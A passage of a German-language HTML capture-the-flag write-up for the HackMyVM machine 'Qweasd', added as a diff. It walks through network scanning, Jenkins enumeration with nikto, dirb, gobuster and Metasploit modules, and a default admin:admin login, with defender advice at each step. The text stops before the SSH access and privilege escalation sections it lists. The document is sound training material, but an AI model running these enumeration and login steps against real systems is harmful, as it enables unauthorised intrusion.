@@ -1,0 +1,616 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Qweasd - HackMyVM - Bericht</title> <!-- Title angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad beibehalten -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Qweasd - HackMyVM - Medium - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <h2>Medium</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, CSS handhabt Farbe -->
+            <div class="circle"> <!-- Kreis-CSS wird 'Medium' (Gelb) handhaben -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe wird durch CSS gesetzt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">msfconsole (Metasploit)</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration (Jenkins)</a></li>
+                <li><a href="#initial-access">Initial Access (SSH)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre><span class="command">192.168.2.122	08:00:27:23:4e:2d	PCS Systemtechnik GmbH</span></pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Befehl `arp-scan -l` sendet ARP-Anfragen ins lokale Netzwerk, um aktive Geräte zu identifizieren. Er listet die gefundene IP-Adresse, die zugehörige MAC-Adresse und den Hersteller der Netzwerkkarte auf.</p>
+            <p class="evaluation">**Bewertung:** Das Zielsystem wurde erfolgreich unter der IP `192.168.2.122` identifiziert. Der Hersteller "PCS Systemtechnik GmbH" und die MAC-Adresse `08:00:27:...` deuten auf eine VirtualBox-VM hin. Dies ist der Startpunkt für weitere Scans.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Notieren Sie die IP-Adresse `192.168.2.122`. Führen Sie Portscans mit Nmap durch, um offene Dienste zu finden.<br>**Empfehlung (Admin):** Standardverhalten im lokalen Netz. Keine spezifische Abwehrmaßnahme gegen ARP-Scans nötig, aber Netzwerksegmentierung kann die Sichtbarkeit einschränken.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre>
+127.0.0.1	localhost
+<span class="command">192.168.2.122   que.hmv</span></pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Die Datei `/etc/hosts` auf dem Angreifer-System wird bearbeitet (hier mit `vi`). Ein Eintrag wird hinzugefügt, der den Hostnamen `que.hmv` der zuvor gefundenen IP-Adresse `192.168.2.122` zuordnet.</p>
+             <p class="evaluation">**Bewertung:** Dies ist eine wichtige Vorbereitungsmaßnahme. Webanwendungen, insbesondere solche mit virtuellen Hosts, reagieren oft nur korrekt, wenn sie über ihren Hostnamen angesprochen werden. Dieser Eintrag stellt sicher, dass Anfragen an `que.hmv` zur richtigen IP geleitet werden.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Gute Praxis, um Probleme bei der Web-Enumeration zu vermeiden. Verwenden Sie `que.hmv` in nachfolgenden Web-Anfragen.<br>**Empfehlung (Admin):** Die `/etc/hosts`-Datei des Angreifers ist irrelevant für die Verteidigung. Die korrekte Konfiguration des eigenen DNS und der Webserver-vHosts ist entscheidend.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.122 -p- | grep open</span></div>
+                    <pre>
+<span class="command">22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span>
+<span class="command">8080/tcp open  http    Jetty 10.0.18</span>
+| http-open-proxy: Potentially OPEN proxy.</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Ein umfassender Nmap-Scan wird auf die Ziel-IP durchgeführt. `-sS` (TCP SYN Scan), `-sV` (Versionserkennung), `-A` (Aggressiver Scan: OS-Erkennung, Versionserkennung, Skripte, Traceroute), `-T5` (Sehr schnelles Timing), `-p-` (Alle TCP-Ports). Die Ausgabe wird mit `grep open` gefiltert.</p>
+            <p class="evaluation">**Bewertung:** Der Scan identifiziert zwei offene TCP-Ports:
+*   **Port 22:** SSH, Version OpenSSH 8.9p1 auf Ubuntu.
+*   **Port 8080:** HTTP, bedient von einem Jetty-Server Version 10.0.18. Das Skript `http-open-proxy` meldet, dass es sich *potenziell* um einen offenen Proxy handeln könnte.
+Dies sind die Hauptangriffsvektoren.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie beide Dienste. Prüfen Sie SSH auf schwache Anmeldedaten oder bekannte Schwachstellen in OpenSSH 8.9p1. Konzentrieren Sie sich auf den HTTP-Dienst auf Port 8080, der von Jetty betrieben wird. Untersuchen Sie die Webanwendung, die dort läuft, und prüfen Sie die "Open Proxy"-Vermutung.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass SSH sicher konfiguriert ist (z.B. keine Passwort-Authentifizierung, aktuelle Version). Überprüfen Sie die Konfiguration des Jetty-Servers und der darauf laufenden Anwendung. Stellen Sie sicher, dass er nicht unbeabsichtigt als offener Proxy fungiert. Halten Sie Jetty und OpenSSH aktuell.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.122 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-09 21:56 CEST
+Nmap scan report for <span class="command">que.hmv (192.168.2.122)</span>
+Host is up (0.00013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+<span class="command">22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span>
+| ssh-hostkey:
+|   256 fa:b1:dc:5b:9e:54:8c:bd:24:4c:43:0c:25:fd:4d:d8 (ECDSA)
+|_  256 29:71:69:ca:bc:74:48:26:45:34:77:69:29:a5:d2:fc (ED25519)
+<span class="command">8080/tcp open  http    Jetty 10.0.18</span>
+|_http-title: <span class="command">Dashboard [Jenkins]</span>
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECT GET HEAD POST OPTIONS TRACE
+| http-robots.txt: 1 disallowed entry
+|_/
+|_http-server-header: Jetty(10.0.18)
+MAC Address: <span class="command">08:00:27:23:4E:2D (Oracle VirtualBox virtual NIC)</span>
+Device type: general purpose
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: <span class="command">Linux 4.15 - 5.8</span>
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms que.hmv (192.168.2.122)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.63 seconds</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Dies ist die vollständige Ausgabe des vorherigen Nmap-Scans (ohne `grep`). Sie enthält zusätzliche Details der NSE-Skripte und der OS/Versionserkennung.</p>
+            <p class="evaluation">**Bewertung:** Die Ausgabe liefert wichtige Zusatzinformationen:
+*   **SSH (Port 22):** Zeigt die ECDSA- und ED25519-Hostkeys an. Bestätigt OpenSSH 8.9p1.
+*   **HTTP (Port 8080):** Der entscheidende Fund hier ist der `http-title`: **"Dashboard [Jenkins]"**. Dies identifiziert die auf Jetty laufende Anwendung als Jenkins, eine weit verbreitete Automatisierungs- und CI/CD-Plattform. Jenkins ist ein häufiges Ziel für Angreifer. Die `robots.txt` verbietet das Crawlen des Root-Verzeichnisses (`/`). Die unterstützten HTTP-Methoden werden aufgelistet.
+*   **OS-Erkennung:** Bestätigt Linux Kernel 4.x/5.x.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Fokussieren Sie sich stark auf die Jenkins-Instanz auf Port 8080. Suchen Sie nach bekannten Schwachstellen in Jenkins (Version wird später durch Nikto/Gobuster ermittelt), Standard-Zugangsdaten, Möglichkeiten zur Skriptausführung (Groovy-Konsole, Pipeline-Jobs), oder Informationslecks. Prüfen Sie die `/robots.txt` (obwohl sie hier nicht viel verbietet).<br>**Empfehlung (Admin):** Jenkins sicher konfigurieren! Dies beinhaltet: aktuelle Version verwenden, Zugriffskontrolle härten, unnötige Plugins deaktivieren, keine Skriptausführung für unautorisierte Benutzer erlauben, Standardpasswörter ändern.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration (Jenkins)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.122:8080</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          <span class="command">192.168.2.122</span>
++ Target Hostname:    <span class="command">192.168.2.122</span>
++ Target Port:        <span class="command">8080</span>
++ Start Time:         2024-05-09 22:01:33 (GMT2)
+---------------------------------------------------------------------------
++ Server: <span class="command">Jetty(10.0.18)</span>
++ /: Uncommon header '<span class="command">x-jenkins-session</span>' found, with contents: 914cd45a.
++ /: Uncommon header '<span class="command">x-instance-identity</span>' found, with contents: MIIBIjANBgkqhkiG9w0BAQEFAACAQ8AMIIBCgKCAQEAnpvd99ztWW+IF8JyctS4diiwezfpN6e6xsxpFkUAfKBdoNywG5pRK7ekKBrats2skYvbW6+DzBrQoV8vdtS+lF9IuI4N35cLFGmmmjqHuhMZDA8dxtH57/sUPbK9jiyinqEqZXHYYddqptRD/deC7H4615n4mQJNAn5tHMorkjK9xj2p50wjnRy4+EBsYcg2oSY+7IS4+Da4I/nwVUL31AEqXTD/rzBGHVSCHlH74yVBDy40h1SgHH7WVo5bdgLaXzxbfakIl+RSlkzxjGwRhlKo8kWuJzP0W5qpqvia0XAupaUoKlTlPYffxdZisEY4zYC8aLvK2/WvEFoFpwIDAQAB.
++ /: Uncommon header '<span class="command">x-hudson</span>' found, with contents: 1.395.
++ /: Uncommon header '<span class="command">x-hudson-theme</span>' found, with contents: default.
++ /: Uncommon header '<span class="command">x-jenkins</span>' found, with contents: <span class="command">2.441</span>.
++ <span class="password">No CGI Directories found</span> (use '-C all' to force check all possible dirs)
++ .: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ <span class="command">Jetty/10.0.18</span> appears to be outdated (current is at least 11.0.6). Jetty 10.0.6 AND 9.4.41.v20210516 are also currently supported.
++ /favicon.ico: identifies this app/server as: <span class="command">Jenkins</span>. See: https://en.wikipedia.org/wiki/Favicon
++ /static/914cd45a/favicon.ico: identifies this app/server as: <span class="command">Jenkins</span>. See: https://en.wikipedia.org/wiki/Favicon
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ /: <span class="password">DEBUG HTTP verb may show server debugging information.</span> See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Nikto wird gegen den Jenkins-Dienst auf Port 8080 ausgeführt.</p>
+            <p class="evaluation">**Bewertung:** Nikto liefert wichtige Bestätigungen und Details:
+*   **Jenkins Identifikation:** Mehrere Header (`x-jenkins-session`, `x-instance-identity`, `x-hudson`, `x-jenkins`) und das Favicon bestätigen eindeutig Jenkins. Die Version wird als `2.441` (`x-jenkins`-Header) identifiziert.
+*   **Jetty:** Bestätigt die veraltete Jetty-Version 10.0.18.
+*   **Sicherheitsheader:** Bestätigt das Fehlen von `X-Content-Type-Options`.
+*   **DEBUG-Methode:** Weist darauf hin, dass die DEBUG-HTTP-Methode aktiviert sein könnte, was sensible Informationen preisgeben kann.
+*   **Keine CGI-Verzeichnisse:** Findet keine Standard-CGI-Pfade.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Recherchieren Sie nach bekannten Schwachstellen für Jenkins Version 2.441. Versuchen Sie, die DEBUG-Methode mit `curl -X DEBUG http://que.hmv:8080/` zu testen. Nutzen Sie Verzeichnis-Bruteforcing-Tools, um spezifische Jenkins-Pfade (wie `/script`, `/manage`, `/job/`) zu finden.<br>**Empfehlung (Admin):** Aktualisieren Sie Jenkins und Jetty auf die neuesten stabilen Versionen. Deaktivieren Sie die DEBUG-HTTP-Methode in der Jetty-Konfiguration. Implementieren Sie fehlende Sicherheitsheader.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">dirb http://192.168.2.122:8080</span></div>
+                    <pre>
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Thu May  9 22:01:39 2024
+URL_BASE: http://192.168.2.122:8080/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4622
+
+---- Scanning URL: http://192.168.2.122:8080/ ----
++ http://192.168.2.122:8080/index (CODE:200|SIZE:14983)
++ DIRECTORY: <span class="command">http://192.168.2.122:8080/about/</span>
++ DIRECTORY: <span class="command">http://192.168.2.122:8080/search/</span>
++ http://192.168.2.122:8080/404 (CODE:200|SIZE:8582)
++ DIRECTORY: <span class="command">http://192.168.2.122:8080/api/</span>
++ DIRECTORY: <span class="command">http://192.168.2.122:8080/assets/</span>
++ DIRECTORY: <span class="command">http://192.168.2.122:8080/computer/</span>
++ DIRECTORY: <span class="command">http://192.168.2.122:8080/computers/</span>
++ http://192.168.2.122:8080/configure (CODE:403|SIZE:628)
+^C ==> Interrupting scan
+
+---- Entering directory: http://192.168.2.122:8080/about/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-i' if you want to scan it anyway)
+
+---- Entering directory: http://192.168.2.122:8080/search/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-i' if you want to scan it anyway)
+
+---- Entering directory: http://192.168.2.122:8080/api/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-i' if you want to scan it anyway)
+
+---- Entering directory: http://192.168.2.122:8080/assets/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-i' if you want to scan it anyway)
+
+---- Entering directory: http://192.168.2.122:8080/computer/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-i' if you want to scan it anyway)
+
+---- Entering directory: http://192.168.2.122:8080/computers/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-i' if you want to scan it anyway)
+
+-----------------
+END_TIME: Thu May  9 22:02:00 2024
+DOWNLOADED: 4622 - FOUND: 8</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Dirb wird verwendet, um nach Verzeichnissen auf dem Jenkins-Server zu suchen. Es verwendet eine Standard-Wortliste (`common.txt`). Der Scan wurde manuell abgebrochen (`^C`).</p>
+            <p class="evaluation">**Bewertung:** Dirb findet mehrere Verzeichnisse, die für Jenkins typisch sind: `/about/`, `/search/`, `/api/`, `/assets/`, `/computer/`, `/computers/`. Es findet auch `/configure`, das jedoch einen 403 Forbidden-Status zurückgibt (Zugriff verweigert). Interessanterweise meldet Dirb, dass viele dieser Verzeichnisse "LISTABLE" sind, was auf aktiviertes Directory Indexing hindeuten könnte, obwohl Nginx dies normalerweise standardmäßig nicht erlaubt. Dies sollte genauer untersucht werden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie die gefundenen Verzeichnisse manuell im Browser, insbesondere `/api/`, `/computer/` und `/asynchPeople/` (aus späterem Metasploit-Scan), um mehr über die Jenkins-Konfiguration und mögliche Informationslecks zu erfahren. Verwenden Sie ein Tool wie Gobuster mit einer spezifischeren Jenkins-Wortliste und Dateiendungssuche für eine gründlichere Enumeration.<br>**Empfehlung (Admin):** Deaktivieren Sie Directory Indexing auf dem Webserver, falls es tatsächlich aktiv ist. Beschränken Sie den Zugriff auf administrative Pfade wie `/configure`.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://que.hmv:8080 -x txt,php,...,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span></div>
+                    <pre>
+<span class="command">http://que.hmv:8080/index</span>                (Status: 200) [Size: 14983]
+<span class="command">http://que.hmv:8080/search</span>               (Status: 302) [Size: 0] [-> http://que.hmv:8080/search/]
+<span class="command">http://que.hmv:8080/about</span>                (Status: 302) [Size: 0] [-> http://que.hmv:8080/about/]
+<span class="command">http://que.hmv:8080/login</span>                (Status: 200) [Size: 2224]
+http://que.hmv:8080/main                 (Status: 500) [Size: 8620]
+<span class="command">http://que.hmv:8080/people</span>               (Status: 302) [Size: 0] [-> http://que.hmv:8080/people/]
+<span class="command">http://que.hmv:8080/assets</span>               (Status: 302) [Size: 0] [-> http://que.hmv:8080/assets/]
+<span class="command">http://que.hmv:8080/computers</span>            (Status: 302) [Size: 0] [-> http://que.hmv:8080/computers/]
+<span class="command">http://que.hmv:8080/computer</span>             (Status: 302) [Size: 0] [-> http://que.hmv:8080/computer/]
+<span class="command">http://que.hmv:8080/api</span>                  (Status: 302) [Size: 0] [-> http://que.hmv:8080/api/]
+<span class="command">http://que.hmv:8080/timeline</span>             (Status: 302) [Size: 0] [-> http://que.hmv:8080/timeline/]
+<span class="command">http://que.hmv:8080/logout</span>               (Status: 302) [Size: 0] [-> http://que.hmv:8080/]
+<span class="command">http://que.hmv:8080/config.xml</span>           (Status: 200) [Size: 237]
+http://que.hmv:8080/404                  (Status: 200) [Size: 8582]
+http://que.hmv:8080/api/index                (Status: 200) [Size: 16122]
+http://que.hmv:8080/api/search               (Status: 302) [Size: 0] [-> http://que.hmv:8080/api/search/]
+<span class="command">http://que.hmv:8080/api/xml</span>                  (Status: 200) [Size: 713]
+<span class="command">http://que.hmv:8080/robots.txt</span>           (Status: 200) [Size: 65]</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Gobuster wird erneut verwendet, diesmal mit dem Hostnamen `que.hmv`, einer Liste gängiger Dateiendungen (`-x`) und dem Ausblenden von 403/404-Fehlern (`-b`).</p>
+            <p class="evaluation">**Bewertung:** Dieser Scan liefert eine detailliertere Sicht auf die Jenkins-Struktur:
+*   Bestätigt viele der von Dirb gefundenen Verzeichnisse (oft mit Status 302, da Gobuster auf das Verzeichnis umleitet).
+*   Findet wichtige Endpunkte: `/login` (Login-Seite), `/people/` (Benutzerliste?), `/api/xml` (XML-API-Endpunkt), `/config.xml` (Konfigurationsdatei?), `/robots.txt`.
+*   `/main` liefert einen Internal Server Error (500), was auf ein Problem hindeuten könnte.
+*   `/configure` liefert weiterhin 403 (Forbidden).
+Der Fund von `/config.xml` ist besonders interessant.</p>
+            <p class="recommendation">**Empfehlung (Pentester):**
+    1. Untersuchen Sie `/login`. Gibt es Standard-Logins?
+    2. Rufen Sie `/people/` auf (oder `/asynchPeople/`, wie später gefunden).
+    3. Laden Sie `/config.xml` und `/api/xml` herunter und analysieren Sie den Inhalt auf sensible Informationen oder Hinweise.
+    4. Prüfen Sie `/robots.txt`.<br>
+**Empfehlung (Admin):** Stellen Sie sicher, dass Konfigurationsdateien wie `config.xml` nicht öffentlich zugänglich sind. Sichern Sie alle API-Endpunkte und die Login-Seite ab. Untersuchen Sie den 500-Fehler bei `/main`.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+http://que.hmv:8080/robots.txt
+
+# we don't want robots to click "build" links
+User-agent: *
+Disallow: /</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Inhalt der `/robots.txt`-Datei, wie von Gobuster gefunden und vermutlich mit `curl` abgerufen.</p>
+            <p class="evaluation">**Bewertung:** Die `robots.txt` ist sehr einfach und verbietet allen Webcrawlern (`User-agent: *`) den Zugriff auf das gesamte Root-Verzeichnis (`Disallow: /`). Dies ist für Suchmaschinen gedacht, hindert aber einen gezielten Angreifer nicht daran, die Seite zu untersuchen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die `robots.txt` liefert hier keine nützlichen Hinweise auf versteckte Verzeichnisse. Ignorieren.<br>**Empfehlung (Admin):** Eine `robots.txt` ist kein Sicherheitsmechanismus. Sensible Bereiche sollten durch Zugriffskontrolle geschützt werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://que.hmv:8080/config.xml</span></div>
+                    <pre><?xml version="1.1" encoding="UTF-8"?>
+<hudson.model.AllView>
+  <name>all</name>
+  <filterExecutors>false</filterExecutors>
+  <filterQueue>false</filterQueue>
+  <properties class="hudson.model.View$PropertyList"/>
+</hudson.model.AllView></pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Inhalt der zuvor gefundenen `/config.xml`-Datei wird mit `curl` abgerufen.</p>
+            <p class="evaluation">**Bewertung:** Diese spezifische `config.xml` scheint eine Konfiguration für eine Jenkins-Ansicht ("all") zu sein und enthält keine sensiblen Informationen wie Passwörter oder Schlüssel. Sie bestätigt lediglich einige Standardeinstellungen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Diese Datei scheint nicht direkt nützlich zu sein. Suchen Sie weiter nach interessanteren Endpunkten oder Konfigurationsdateien.<br>**Empfehlung (Admin):** Auch wenn diese Datei harmlos ist, sollte der Zugriff auf Konfigurationsdateien generell eingeschränkt werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+http://que.hmv:8080/login?from=%2F
+
+<span class="password">admin:admin</span></pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Eine Notiz des Pentesters. Es wird die URL der Login-Seite (`/login`) gezeigt und darunter stehen die Zugangsdaten `admin:admin`.</p>
+            <p class="evaluation">**Bewertung:** Dies ist ein **kritischer Fund!** Es deutet stark darauf hin, dass die Standard-Zugangsdaten `admin:admin` für die Jenkins-Instanz funktionieren. Dies ist eine häufige Fehlkonfiguration.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie sofort, sich mit `admin:admin` über die `/login`-Seite in Jenkins einzuloggen. Wenn erfolgreich, suchen Sie nach Möglichkeiten zur Codeausführung (Groovy-Konsole, Pipeline-Jobs).<br>**Empfehlung (Admin):** **Niemals Standard-Zugangsdaten verwenden!** Ändern Sie das Passwort für den `admin`-Benutzer sofort in ein starkes, einzigartiges Passwort. Implementieren Sie ggf. weitere Sicherheitsmaßnahmen wie Zwei-Faktor-Authentifizierung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 > <span class="command">use auxiliary/scanner/http/jenkins_enum</span></div>
+                    <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/http/jenkins_enum) > <span class="command">options</span></div>
+                    <pre>
+Module options (auxiliary/scanner/http/jenkins_enum):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:p
+                                         ort][...]
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /jenkins/        yes       The path to the Jenkins-CI application
+   THREADS    1                yes       The number of concurrent threads (max one per host)
+   VHOST                       no        HTTP server virtual host
+
+
+View the full module info with the info, or info -d command.</pre>
+                    <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/http/jenkins_enum) > <span class="command">set rhosts 192.168.2.122</span></div>
+                    <pre>rhosts => 192.168.2.122</pre>
+                    <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/http/jenkins_enum) > <span class="command">set rport 8080</span></div>
+                    <pre>rport => 8080</pre>
+                    <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/http/jenkins_enum) > <span class="command">set TARGETURI /</span></div>
+                    <pre>TARGETURI => /</pre>
+                    <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/http/jenkins_enum) > <span class="command">run</span></div>
+                    <pre>
+[+] <span class="command">192.168.2.122:8080    - Jenkins Version 2.441</span>
+[*] /script restricted (403)
+[*] /view/All/newJob restricted (403)
+[+] <span class="command">http://192.168.2.122:8080/ - /asynchPeople/ does not require authentication (200)</span>
+[*] /systemInfo restricted (403)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Das Metasploit Framework (`msfconsole`) wird gestartet. Das Modul `auxiliary/scanner/http/jenkins_enum` wird geladen. Dieses Modul ist darauf spezialisiert, Informationen von einer Jenkins-Instanz zu sammeln. Die Optionen werden gesetzt: `RHOSTS` auf die Ziel-IP, `RPORT` auf 8080 und `TARGETURI` auf `/` (da Jenkins im Root-Verzeichnis läuft, nicht unter `/jenkins/`). Das Modul wird dann ausgeführt.</p>
+            <p class="evaluation">**Bewertung:** Das Modul bestätigt die Jenkins-Version 2.441. Es stellt fest, dass einige sensible Pfade wie `/script` (Groovy-Konsole) und `/systemInfo` nicht ohne Authentifizierung zugänglich sind (Status 403 Forbidden). Ein wichtiger Fund ist jedoch, dass der Pfad `/asynchPeople/` ohne Authentifizierung zugänglich ist (Status 200 OK). Dieser Endpunkt listet oft Jenkins-Benutzer auf.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Rufen Sie den Pfad `/asynchPeople/` manuell im Browser oder mit `curl` auf, um die dort sichtbaren Benutzerinformationen zu extrahieren. Dies kann die Liste der Benutzernamen für Brute-Force-Angriffe oder Social Engineering bestätigen oder erweitern. Da der Login mit `admin:admin` vermutet wird, ist dies möglicherweise nicht mehr der primäre Fokus, aber gut zur Bestätigung.<br>**Empfehlung (Admin):** Beschränken Sie den Zugriff auf Pfade wie `/asynchPeople/` oder `/people/`, sodass sie nur für authentifizierte Benutzer zugänglich sind, um die Enumeration von Benutzernamen zu verhindern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/http/jenkins_login) > <span class="command">set ANONYMOUS_LOGIN false</span></div> <span class="comment"><-- Modulname scheint falsch, sollte jenkins_enum sein? --></span>
+                    <pre>ANONYMOUS_LOGIN => false</pre>
+                    <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/http/jenkins_login) > <span class="command">set rhosts 192.168.2.122</span></div>
+                    <pre>rhosts => 192.168.2.122</pre>
+                    <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/http/jenkins_login) > <span class="command">set rport 8080</span></div>
+                    <pre>rport => 8080</pre>
+                    <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/http/jenkins_login) > <span class="command">run</span></div>
+                    <pre>
+[*] Error: 192.168.2.122: Metasploit::Framework::LoginScanner::Invalid Cred details can't be blank, Cred details can't be blank (Metasploit::Framework::LoginScanner::Jenkins)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Es wird versucht, ein anderes Metasploit-Modul zu verwenden, das hier als `jenkins_login` bezeichnet wird (obwohl der Prompt dies nicht widerspiegelt, möglicherweise ein Kopierfehler). Die Option `ANONYMOUS_LOGIN` wird auf `false` gesetzt, und die Zielparameter werden erneut definiert. Beim Ausführen tritt ein Fehler auf.</p>
+            <p class="evaluation">**Bewertung:** Das Modul schlägt fehl, weil keine Zugangsdaten (Benutzername/Passwort oder Passwortliste) angegeben wurden (`Invalid Cred details can't be blank`). Dieser Versuch, ein Login-Scanner-Modul ohne Angabe von Anmeldeinformationen auszuführen, war nicht korrekt konfiguriert.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Wenn ein Login-Scan durchgeführt werden soll, verwenden Sie das korrekte Modul (z.B. `auxiliary/scanner/http/jenkins_login`) und geben Sie entweder feste Zugangsdaten (`USERNAME`, `PASSWORD`) oder Dateien mit Benutzernamen und Passwörtern (`USER_FILE`, `PASS_FILE`) an. Da jedoch `admin:admin` bereits vermutet wird, ist der direkte Login-Versuch wahrscheinlich effizienter.<br>**Empfehlung (Admin):** Keine Aktion erforderlich, da der Angriffsversuch fehlschlug.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
